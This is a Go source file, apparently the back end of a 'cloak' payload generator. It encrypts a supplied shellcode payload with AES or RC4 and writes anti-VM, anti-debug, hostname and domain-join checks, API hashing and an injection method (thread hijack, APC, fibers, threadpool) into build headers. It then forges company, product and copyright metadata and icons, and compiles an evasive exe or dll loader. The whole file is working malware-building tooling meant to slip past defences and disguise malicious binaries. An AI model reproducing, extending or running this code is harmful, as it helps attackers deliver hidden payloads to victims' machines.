package api

import (
	"cloak-ui/api/transport"
	"database/sql"
	"errors"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"

	gecko "github.com/HackLike-co/Gecko/Gecko"
	_ "github.com/glebarez/go-sqlite"
)

func Generate(w http.ResponseWriter, r *http.Request) {

}

func generate(g transport.Generate) ([]byte, error) {
	// open Payload.hpp file
	pFile, err := os.OpenFile("./cloak/include/Payload.hpp", os.O_RDWR|os.O_TRUNC, 0755)
	if err != nil {
		return nil, err
	}
	defer pFile.Close()

	// check for encryption
	switch g.EncryptionAlgo {
	case "aes":
		key, err := gecko.GenerateKey()
		if err != nil {
			return nil, err
		}

		iv, err := gecko.GenerateIV()
		if err != nil {
			return nil, err
		}

		// encrypt payload
		ePayload, err := gecko.AES_CBCEncrypt(g.Payload, key, iv)
		if err != nil {
			log.Fatal(err)
		}

		output := fmt.Sprintf("#pragma once\n\n%s\n\n%s\n\n%s", gecko.C_FormatArray(ePayload, "Payload"), gecko.C_FormatArray(key, "Key"), gecko.C_FormatArray(iv, "IV"))

		// write updated payload
		pFile.WriteString(output)
	case "rc4":
		key, err := gecko.GenerateKey()
		if err != nil {
			return nil, err
		}

		// encrypt payload
		ePayload, err := gecko.RC4_Encrypt(g.Payload, key)
		if err != nil {
			log.Fatal(err)
		}

		output := fmt.Sprintf("#pragma once\n\n%s\n\n%s", gecko.C_FormatArray(ePayload, "Payload"), gecko.C_FormatArray(key, "Key"))

		// write updated payload
		pFile.WriteString(output)
	case "none":
		output := fmt.Sprintf("#pragma once\n\n%s", gecko.C_FormatArray(g.Payload, "Payload"))

		// write updated payload
		pFile.WriteString(output)
	default:
		return nil, errors.New("invalid encryption type")
	}

	// open Config.hpp file
	configFile, err := os.OpenFile("./cloak/include/Config.hpp", os.O_RDWR|os.O_TRUNC, 0755)
	if err != nil {
		return nil, err
	}
	defer configFile.Close()

	configOutput := "#pragma once\n\n#ifndef CONFIG_H\n#define CONFIG_H\n\n"

	if g.OutputFormat == "dll" {
		configOutput += "#define DLL\n\n"
	}

	switch g.EncryptionAlgo {
	case "aes":
		configOutput += "#define AES\n\n"
	case "rc4":
		configOutput += "#define RC4\n\n"
	}

	if g.ExecDelay > 0 {
		configOutput += fmt.Sprintf("#define DELAY %d\n\n", g.ExecDelay)

	}

	if g.Debug {
		configOutput += "#define DEBUG\n\n"
	}

	if g.CheckVm {
		configOutput += "#define ANTI_VM\n\n"
	}

	if g.CheckDebug {
		configOutput += "#define ANTI_DEBUG\n\n"
	}

	if g.CheckHostname {
		configOutput += fmt.Sprintf("#define CHECK_HOSTNAME\n\n#ifdef CHECK_HOSTNAME\n#define HOSTNAME \"%s\"\n#endif\n\n", g.Hostname)
	}

	if g.CheckDomainJoined {
		configOutput += "#define CHECK_DOMAIN_JOINED\n\n"
	}

	if g.DoApiHashing {
		// generate rand
		r := rand.Intn(255-1) + 1
		configOutput += fmt.Sprintf("#define HASH_API\n#define RAND 0x%02X\n\n", r)
	}

	switch g.ExecutionMethod {
	case "inject":
		switch g.InjectMethod {
		case "local-thread":
			configOutput += "#define LOCAL_THREAD\n\n"
		case "local-hijack":
			configOutput += "#define LOCAL_THREAD_HIJACK\n\n"
		case "local-hijack-enum":
			configOutput += "#define LOCAL_THREAD_HIJACK_ENUM\n\n"
		case "apc":
			configOutput += "#define APC_INJECT\n\n"
		default:
			return nil, errors.New("invalid injection method")
		}
	case "fibers":
		configOutput += "#define FIBERS\n\n"
	case "threadpool":
		configOutput += "#define THREADPOOLWAIT\n\n"
	default:
		return nil, errors.New("invalid execution method")
	}

	configOutput += "#define WAIT_TIME INFINITE\n\n#endif"

	// write to config file
	configFile.WriteString(configOutput)

	// if dll, open main file and replace exported function name
	if g.OutputFormat == "dll" {
		replaceFuncName("./cloak/src/Main.cpp", "Start", g.ExportedFunc)
	}

	// open resource file
	rFile, err := os.OpenFile("./cloak/cloak.rc", os.O_RDWR|os.O_TRUNC, 0755)
	if err != nil {
		return nil, err
	}
	defer rFile.Close()

	var resrcOutput string

	if g.Icon != "none" && g.Icon != "invalid" {
		resrcOutput += fmt.Sprintf("ID ICON icons/%s.ico\n", g.Icon)
	}

	resrcOutput += "1 VERSIONINFO\n"
	resrcOutput += fmt.Sprintf("FILEVERSION %s\nBEGIN\n\tBLOCK \"StringFileInfo\"\n\tBEGIN\n\t\tBLOCK\"040904E4\"\n\t\tBEGIN\n", g.FileVersion)
	resrcOutput += fmt.Sprintf("\t\t\tVALUE \"CompanyName\", \"%s\"\n", g.CompanyName)
	resrcOutput += fmt.Sprintf("\t\t\tVALUE \"FileDescription\", \"%s\"\n", g.FileDescription)
	resrcOutput += fmt.Sprintf("\t\t\tVALUE \"InternalName\", \"%s\"\n", g.InternalName)
	resrcOutput += fmt.Sprintf("\t\t\tVALUE \"OriginalFilename\", \"%s\"\n", g.OriginalFilename)
	resrcOutput += fmt.Sprintf("\t\t\tVALUE \"LegalCopyright\", \"%s\"\n", g.Copyright)
	resrcOutput += fmt.Sprintf("\t\t\tVALUE \"ProductName\", \"%s\"\n", g.ProductName)
	resrcOutput += fmt.Sprintf("\t\t\tVALUE \"ProductVersion\", \"%s\"\n", g.ProductVersion)
	resrcOutput += "\t\tEND\n\tEND\n\tBLOCK\"VarFileInfo\"\n\tBEGIN\n\t\tVALUE \"Translation\", 0x409, 1252\n\tEND\nEND"

	// write to resource file
	rFile.WriteString(resrcOutput)

	// run make
	var cmd string
	if g.OutputFormat == "dll" {
		cmd = "make dll -C ./cloak/"
	} else {
		cmd = "make exe -C ./cloak/"
	}
	cmdNoReturn(cmd)

	// read generated file
	var fPayload []byte
	var src string
	if g.OutputFormat == "dll" {
		src = "./cloak/bin/cloak.dll"
	} else {
		src = "./cloak/bin/cloak.exe"
	}

	fPayload, err = os.ReadFile(src)
	if err != nil {
		return nil, err
	}

	// replace function name back to start if dll
	if g.OutputFormat == "dll" {
		replaceFuncName("./cloak/src/Main.cpp", g.ExportedFunc, "Start")
	}

	// add payload to database
	db, err := sql.Open("sqlite", "./cloak.db")
	if err != nil {
		log.Fatal(err)
	}

	t := time.Now().Unix()
	db.Exec("INSERT INTO Payloads VALUES(NULL, $1, $2, $3)", g.OutputName, g.OutputFormat, t)
	db.Close()

	// copy payload to ./bin
	err = copyFile(src, fmt.Sprintf("./bins/%s_%d.%s", g.OutputName, t, g.OutputFormat))
	if err != nil {
		log.Println(err)
	}

	// return generated payload
	return fPayload, nil
}

func cmdNoReturn(c string) {
	cmd := exec.Command("bash", "-c", c)
	cmd.Run()
}

func replaceFuncName(fPath string, og string, new string) error {
	f, err := os.ReadFile(fPath)
	if err != nil {
		return err
	}

	lines := strings.Split(string(f), "\n")

	for i, line := range lines {
		if strings.Contains(line, fmt.Sprintf("DLLEXPORT VOID %s", og)) {
			lines[i] = fmt.Sprintf("DLLEXPORT VOID %s() {", new)
		}
	}

	out := strings.Join(lines, "\n")
	err = os.WriteFile(fPath, []byte(out), 0755)
	if err != nil {
		return err
	}

	return nil
}

func copyFile(src, dst string) (err error) {
	sfi, err := os.Stat(src)
	if err != nil {
		return
	}
	if !sfi.Mode().IsRegular() {
		// cannot copy non-regular files (e.g., directories,
		// symlinks, devices, etc.)
		return fmt.Errorf("CopyFile: non-regular source file %s (%q)", sfi.Name(), sfi.Mode().String())
	}
	dfi, err := os.Stat(dst)
	if err != nil {
		if !os.IsNotExist(err) {
			return
		}
	} else {
		if !(dfi.Mode().IsRegular()) {
			return fmt.Errorf("CopyFile: non-regular destination file %s (%q)", dfi.Name(), dfi.Mode().String())
		}
		if os.SameFile(sfi, dfi) {
			return
		}
	}
	if err = os.Link(src, dst); err == nil {
		return
	}
	err = copyFileContents(src, dst)
	return
}

func copyFileContents(src, dst string) (err error) {
	in, err := os.Open(src)
	if err != nil {
		return
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return
	}
	defer func() {
		cerr := out.Close()
		if err == nil {
			err = cerr
		}
	}()
	if _, err = io.Copy(out, in); err != nil {
		return
	}
	err = out.Sync()
	return
}
